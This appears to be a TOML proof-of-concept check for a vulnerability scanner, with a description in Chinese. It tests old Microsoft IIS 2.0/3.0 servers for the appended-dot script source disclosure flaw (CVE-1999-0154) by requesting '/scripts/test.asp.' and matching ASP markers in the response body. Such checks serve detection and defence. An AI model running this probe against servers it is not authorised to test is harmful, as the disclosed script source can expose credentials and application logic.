[info]
author = "ave"
description = "验证 Microsoft IIS 2.0/3.0 是否存在追加点号脚本源代码泄露漏洞。攻击者通过在 ASP/scripts 文件 URL 后追加一个点号(.)，可绕过服务器脚本执行限制，直接获取脚本源代码。"
id = "POC-AVE-1999-0006"
name = "Microsoft IIS 2.0/3.0 Appended Dot Script Source Disclosure PoC"
severity = "medium"
tags = ["ave-1999-0006"]
vuln_id = [
    "CVE-1999-0154",
    "AVE-1999-0006",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/scripts/test.asp."
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%",
    "language=",
    "Response.",
]
